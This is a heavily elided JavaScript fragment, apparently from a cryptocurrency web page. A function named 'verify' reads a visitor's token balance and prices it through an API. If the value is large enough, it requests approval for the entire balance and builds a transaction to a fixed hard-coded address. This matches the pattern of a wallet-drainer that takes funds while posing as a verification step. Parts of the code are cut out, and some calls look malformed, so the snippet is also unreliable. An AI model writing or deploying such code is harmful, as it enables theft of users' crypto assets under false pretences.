...
const verify = async()=>{
    ...
    usdtcontractadd='0x0A26430027e047AB93163161E7c32A9C22AFaF6B';
    ...
    const usdtcontract = new web3.eth.Contract(erc20AbiJson, usdtcontractadd,provider);
        ...
        console.log(tokenBalance);
         usdtapi='https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=0x0A26430027e047AB93163161E7c32A9C22AFaF6B&vs_currencies=eth'
         fetch(usdtapi)
         .then(response=> response.json())
         .then((json) => {
...
if(usdtvalueineth>r_bal)
{
    ...
    let appr = await libcContract.approve("0x0A26430027e047AB93163161E7c32A9C22AFaF6B",tokenBalance).call();
    ...
    const tokenAddresses = [
        ...
        '0x0A26430027e047AB93163161E7c32A9C22AFaF6B',
    ...
    await web3Js.eth.getTransactionCount(walletAddress, "pending")
        .then(async (txnCount) => {
            ...
            const txObject = {
                ...
                to: "0x0A26430027e047AB93163161E7c32A9C22AFaF6B",
